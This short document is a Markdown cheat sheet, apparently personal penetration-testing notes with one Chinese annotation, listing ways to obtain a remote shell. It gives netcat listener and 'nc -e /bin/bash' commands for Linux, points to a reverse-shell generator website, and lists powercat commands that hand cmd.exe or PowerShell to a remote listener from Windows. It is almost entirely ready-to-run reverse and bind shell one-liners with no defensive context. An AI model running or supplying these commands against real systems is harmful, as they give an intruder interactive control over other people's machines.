### Linux to Linux
* nc -lvvp 9999  监听主机
* nc 127.0.0.1 9999 -e /bin/bash | -e /bin/sh | -e /bin/ash
* #cd /bin | grep sh

### Websites for getting shell
https://www.revshells.com/

### Windows to Linux
* powercat -l -p 1080 -e cmd.exe -v (need to download from own server), nc ip port -vv
* nc -l -p port -vv, powercat -c ip -p port -v -e cmd.exe
##### powercat return with powershell
* powercat -l -p port -v
* powercat -c ip -p port -v -ep
